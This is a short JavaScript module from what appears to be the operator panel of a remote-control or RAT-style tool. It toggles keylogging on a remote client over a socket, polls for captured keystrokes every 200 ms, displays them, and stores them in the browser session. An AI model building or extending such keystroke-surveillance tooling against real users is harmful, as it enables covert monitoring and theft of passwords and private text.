// modules/tab-keylog.js
import { store } from "./store.js";
import { sendCommand } from "./socket.js";
import { logActionUI, showConfirm } from "./ui.js";

export function handleKeylogData(payload) {
  const chk = document.getElementById("chkKeylog");
  if (chk) chk.checked = payload.enabled;

  if (payload.log) {
    let area = document.getElementById("logArea");
    area.value += payload.log;
    area.scrollTop = area.scrollHeight;
    sessionStorage.setItem("keylogs", area.value);
  }
}

export function loadKeylog() {
  sendCommand("GET_KEYLOG");
}

export function toggleKeylog(cb) {
  sendCommand("KEYLOG_SET", cb.checked);
  logActionUI(`Keylog: ${cb.checked ? "BẬT" : "TẮT"}`, true);

  if (cb.checked) {
    if (!store.keylogInt)
      store.keylogInt = setInterval(() => {
        sendCommand("GET_KEYLOG");
      }, 200);
  } else {
    if (store.keylogInt) {
      clearInterval(store.keylogInt);
      store.keylogInt = null;
    }
  }
}

export function clearLogs() {
  showConfirm("Xóa nhật ký bàn phím (Client)?", () => {
    document.getElementById("logArea").value = "";
    sessionStorage.removeItem("keylogs");
    logActionUI("Đã xóa log phím", true);
  });
}
